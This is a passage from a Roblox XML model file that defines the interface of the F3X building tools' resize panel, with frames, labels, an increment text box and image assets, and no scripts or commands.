											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX6AA45FD55C8F4CC4870410221ADED577">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127774197</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX47C6372F0ADB44ADBBF13E853788A06A">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">NORMAL</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXA9437634D00F429A85C96007C1889C56">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Both</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>135</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX4BBA404301BA49CD8CEDDBDD7973CA4C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXBCA0F4E006194D6C9AAAB23F4AD5CA1E">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX0209DC18F6824201B831F611C298389F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBX5507D77994C143688CED2493D5273A1D">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">Label</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">BOTH</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBXD2E427953EA04CAF910F02C126D6B76E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>75</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXC72D8DEB3DC14DDC80332B7D68D52FB4">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Directions</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXAA6050F8A2FE44A0ADE9DDBE806A39D7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">Title</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>20</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX49420A604E124BC98691C06FDF84384A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278497260</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>5</XO>
											<YS>0</YS>
											<YO>-3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-5</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBX711EF07F18E7425C8D677DAB66DBAD29">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">RESIZE TOOL</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextLabel" referent="RBXCB52546A726A42E9B69017D3EB927C5C">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">5</token>
										<string name="Name">F3XSignature</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">F3X</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">14</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.899999976</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">1</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXCCE1270A0A054A278F91297CE32CF213">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">IncrementOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX0FA8459076E74F5A9BDA8A6481F8C6C9">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Increment</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX26611E6FB58D4A6582FEA13AE467855E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-4</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX1963BD92206D4D369DAEA78832C4460E">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="ImageLabel" referent="RBX85DDBB0F8DAE4C5EA1156D75489AF946">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX830E713937834E12A52C293E4B0A3798">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>75</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXCE3DA1322F6442D2A202ABE8FD4DD787">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Increment</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXB26A7121EF0E4658A6F978CFD485D966">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
